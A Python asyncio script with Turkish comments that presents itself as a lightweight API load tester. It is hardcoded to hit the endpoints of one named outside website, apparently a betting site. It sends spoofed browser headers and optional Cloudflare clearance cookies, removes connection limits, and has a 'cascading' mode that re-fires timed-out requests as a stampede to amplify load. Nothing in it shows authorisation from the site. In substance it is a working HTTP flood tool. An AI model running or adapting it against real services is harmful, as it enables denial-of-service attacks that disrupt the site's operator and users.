"""
Ultra Hafif Asenkron API Yük Testi (AsyncIO + aiohttp)
CPU: ~%3-5 | RAM: ~30 MB | Kapasite: 500-2000+ RPS
"""

import asyncio
import aiohttp
import time
import argparse
import sys
import random

URL = "https://www.7xwon.com/api/main-events"
HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://www.7xwon.com",
    "Referer": "https://www.7xwon.com/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
}

PAYLOAD = {
    "type": 0,
    "odds": 1,
    "code": False,
    "s": 1,
    "t": False
}

class Stats:
    def __init__(self):
        self.ok = 0
        self.failed = 0
        self.timeouts = 0
        self.latencies = []
        self.lock = asyncio.Lock()

async def fetch_live_event_ids(session, headers):
    try:
        url = "https://www.7xwon.com/api/main-events"
        payload = {"type": 0, "odds": 0, "code": False, "s": 1, "t": False}
        async with session.post(url, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=6.0)) as resp:
            if resp.status == 200:
                data = await resp.json()
                items = data.get("data") or data.get("events") or []
                if isinstance(items, dict):
                    items = list(items.values())
                ids = []
                for item in items:
                    if isinstance(item, dict):
                        eid = item.get("id") or item.get("eventid") or item.get("eventId")
                        if eid:
                            ids.append(int(eid))
                if ids:
                    return ids
    except Exception:
        pass
    return [36223071, 36223072, 36223073, 36223074, 36223075]

async def worker(session, target_url, payload, headers, stats, timeout_sec, is_cascading=False):
    start_time = time.perf_counter()
    try:
        async with session.post(
            target_url,
            json=payload,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=timeout_sec)
        ) as response:
            await response.read()
            duration = (time.perf_counter() - start_time) * 1000
            
            async with stats.lock:
                stats.latencies.append(duration)
                if 200 <= response.status < 400:
                    stats.ok += 1
                else:
                    stats.failed += 1
    except asyncio.TimeoutError:
        async with stats.lock:
            stats.timeouts += 1
            stats.failed += 1
        # Cascading abort: spawn immediate retry
        if is_cascading:
            asyncio.create_task(worker(session, target_url, payload, headers, stats, timeout_sec, False))
    except Exception:
        async with stats.lock:
            stats.failed += 1

async def reporter(stats, interval=1.0):
    """Terminalde canlı ve son derece hafif istatistik basar."""
    prev_ok = 0
    prev_fail = 0
    
    print("\n" + "="*70)
    print(f"{'Zaman':<10} | {'Anlık RPS':<10} | {'Başarılı':<10} | {'Hata':<8} | {'Timeout':<8} | {'Ort. ms':<8}")
    print("="*70)
    
    while True:
        await asyncio.sleep(interval)
        async with stats.lock:
            cur_ok = stats.ok
            cur_fail = stats.failed
            timeouts = stats.timeouts
            latencies = stats.latencies[-100:] if stats.latencies else []
            
        rps = (cur_ok - prev_ok) / interval
        avg_ms = sum(latencies) / len(latencies) if latencies else 0
        now_str = time.strftime("%H:%M:%S")
        
        status_color = "\033[92m" if timeouts == 0 and cur_fail == prev_fail else "\033[91m"
        reset_color = "\033[0m"
        
        print(f"{now_str:<10} | {rps:>9.1f} | {cur_ok:>10} | {status_color}{cur_fail:>8}{reset_color} | {status_color}{timeouts:>8}{reset_color} | {avg_ms:>7.1f}ms")
        
        prev_ok = cur_ok
        prev_fail = cur_fail

async def main():
    parser = argparse.ArgumentParser(description="Ultra-Lightweight Async API Load Tester")
    parser.add_argument("--target", type=str, choices=["main", "event", "both"], default="both", help="Hedef: 'main', 'event' veya 'both' (her ikisi)")
    parser.add_argument("--all-matches", action="store_true", help="Canlıdaki tüm maçları çekip farklı maçlara aynı anda yüklenir")
    parser.add_argument("--cascading", action="store_true", help="1. Kural: 2.5s gecikmede iptal edip stampede yeniden ateşler")
    parser.add_argument("--event-id", type=int, default=36223071, help="Tek maç detayı için maç id")
    parser.add_argument("--rps", type=int, default=50, help="Saniyede hedeflenen istek sayısı")
    parser.add_argument("--duration", type=int, default=60, help="Test süresi sn")
    parser.add_argument("--token", type=str, default="", help="Bearer token")
    parser.add_argument("--cookie", type=str, default="", help="Cookie / cf_clearance")
    parser.add_argument("--user-agent", type=str, default="", help="Custom User-Agent")
    parser.add_argument("--timeout", type=float, default=5.0, help="İstek zaman aşımı sn")
    parser.add_argument("--odds", type=int, default=1, help="odds parametresi (1 veya 0)")
    args = parser.parse_args()

    effective_timeout = 2.5 if args.cascading else args.timeout

    print(f"\n[+] Hedef Modu: {args.target} | All Matches Dağıtım: {args.all_matches} | Cascading Abort: {args.cascading}")
    print(f"[+] Hedeflenen Hız: {args.rps} RPS | Süre: {args.duration}s | Timeout: {effective_timeout}s")
    print("[+] Motor: AsyncIO Event-Loop (CPU & RAM tasarruf modu aktif)")

    stats = Stats()
    
    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        keepalive_timeout=30.0,
        enable_cleanup_closed=True
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        report_task = asyncio.create_task(reporter(stats))
        
        headers = dict(HEADERS)
        if args.user_agent:
            headers["User-Agent"] = args.user_agent
        if args.cookie:
            headers["Cookie"] = args.cookie
        if args.token:
            headers["Authorization"] = f"Bearer {args.token}"

        event_ids = [args.event_id]
        if args.all_matches or args.target in ("event", "both"):
            event_ids = await fetch_live_event_ids(session, headers)
            print(f"[+] {len(event_ids)} adet canlı maç id'si havuza alındı: {event_ids[:5]}...")

        interval = 1.0 / args.rps
        start_time = time.perf_counter()
        tasks = []
        
        total_requests = args.rps * args.duration
        for index in range(total_requests):
            req_start = time.perf_counter()
            if (req_start - start_time) >= args.duration:
                break
            
            if args.target == "both":
                if index % 2 == 0:
                    t_url = "https://www.7xwon.com/api/main-events"
                    t_payload = dict(PAYLOAD)
                    t_payload["odds"] = args.odds
                else:
                    t_url = "https://www.7xwon.com/api/event"
                    t_payload = {"id": random.choice(event_ids)}
            elif args.target == "event":
                t_url = "https://www.7xwon.com/api/event"
                t_payload = {"id": random.choice(event_ids)}
            else:
                t_url = "https://www.7xwon.com/api/main-events"
                t_payload = dict(PAYLOAD)
                t_payload["odds"] = args.odds
                
            task = asyncio.create_task(worker(session, t_url, t_payload, headers, stats, effective_timeout, args.cascading))
            tasks.append(task)
            
            elapsed = time.perf_counter() - req_start
            wait_time = interval - elapsed
            if wait_time > 0:
                await asyncio.sleep(wait_time)
                
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
            
        report_task.cancel()
        
    print("\n" + "="*70)
    print(f"TEST TAMAMLANDI: Toplam Başarılı: {stats.ok} | Hata: {stats.failed} | Timeout: {stats.timeouts}")
    print("="*70)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Test kullanıcı tarafından durduruldu.")
        sys.exit(0)
